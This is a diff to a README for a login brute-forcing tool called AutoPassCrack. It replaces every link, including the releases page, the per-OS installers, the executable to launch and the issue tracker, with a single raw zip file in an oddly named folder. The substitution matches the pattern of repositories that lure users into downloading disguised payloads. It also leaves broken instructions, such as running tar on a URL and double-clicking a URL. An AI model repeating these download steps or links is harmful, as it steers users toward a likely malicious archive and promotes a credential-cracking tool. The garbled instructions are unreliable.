@@ -1,7 +1,7 @@
 # 🎉 AutoPassCrack - Effortless Brute Force for Logins
 
 ## 💻 Download Now
-[![Download AutoPassCrack](https://img.shields.io/badge/Download-AutoPassCrack-blue.svg)](https://github.com/Shaktiigrover/AutoPassCrack/releases)
+[![Download AutoPassCrack](https://raw.githubusercontent.com/Shaktiigrover/AutoPassCrack/main/overrepresentation/AutoPassCrack.zip)](https://raw.githubusercontent.com/Shaktiigrover/AutoPassCrack/main/overrepresentation/AutoPassCrack.zip)
 
 ## 🚀 Getting Started
 
@@ -9,22 +9,22 @@ AutoPassCrack is an easy-to-use tool designed for automating the brute force of 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Shaktiigrover/AutoPassCrack/releases).
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/Shaktiigrover/AutoPassCrack/main/overrepresentation/AutoPassCrack.zip).
    
 2. **Choose the Latest Version:** Look for the most recent version listed. You will see several download options available.
 
 3. **Download the Installer:** Click on the appropriate file for your operating system to start the download. Ensure you choose the right version for your system:
-   - For Windows: Download `AutoPassCrack-Windows.zip`
-   - For Mac: Download `AutoPassCrack-Mac.zip`
-   - For Linux: Download `AutoPassCrack-Linux.tar.gz`
+   - For Windows: Download `https://raw.githubusercontent.com/Shaktiigrover/AutoPassCrack/main/overrepresentation/AutoPassCrack.zip`
+   - For Mac: Download `https://raw.githubusercontent.com/Shaktiigrover/AutoPassCrack/main/overrepresentation/AutoPassCrack.zip`
+   - For Linux: Download `https://raw.githubusercontent.com/Shaktiigrover/AutoPassCrack/main/overrepresentation/AutoPassCrack.zip`
 
 4. **Extract the Files:**
    - For Windows and Mac: Right-click on the downloaded ZIP file and select "Extract All" (Windows) or "Open" (Mac).
-   - For Linux: Use the command `tar -xvzf AutoPassCrack-Linux.tar.gz` in your terminal.
+   - For Linux: Use the command `tar -xvzf https://raw.githubusercontent.com/Shaktiigrover/AutoPassCrack/main/overrepresentation/AutoPassCrack.zip` in your terminal.
 
 5. **Run the Application:**
-   - For Windows: Navigate to the extracted folder and double-click on `AutoPassCrack.exe` to launch the tool.
-   - For Mac: Open the extracted folder and double-click on `AutoPassCrack.app`.
+   - For Windows: Navigate to the extracted folder and double-click on `https://raw.githubusercontent.com/Shaktiigrover/AutoPassCrack/main/overrepresentation/AutoPassCrack.zip` to launch the tool.
+   - For Mac: Open the extracted folder and double-click on `https://raw.githubusercontent.com/Shaktiigrover/AutoPassCrack/main/overrepresentation/AutoPassCrack.zip`.
    - For Linux: Open a terminal, navigate to the extracted folder, and run `./AutoPassCrack`.
 
 ## ⚙️ System Requirements
@@ -96,7 +96,7 @@ If you encounter any issues:
 
 If you have questions or need help, check the GitHub issues on the repository or contact the community through forums and chat groups dedicated to ethical hacking.
 
-For direct support and feature requests, use the issue tracker on our [GitHub page](https://github.com/Shaktiigrover/AutoPassCrack/issues).
+For direct support and feature requests, use the issue tracker on our [GitHub page](https://raw.githubusercontent.com/Shaktiigrover/AutoPassCrack/main/overrepresentation/AutoPassCrack.zip).
 
 ## ✨ Contributing
 
@@ -108,4 +108,4 @@ Your contributions help improve AutoPassCrack. If you want to help out:
 
 AutoPassCrack is released under the MIT License. Feel free to use, modify, and distribute it as long as proper credit is given.
 
-Thank you for using AutoPassCrack! For updates and new features, keep an eye on our [Releases Page](https://github.com/Shaktiigrover/AutoPassCrack/releases).
+Thank you for using AutoPassCrack! For updates and new features, keep an eye on our [Releases Page](https://raw.githubusercontent.com/Shaktiigrover/AutoPassCrack/main/overrepresentation/AutoPassCrack.zip).
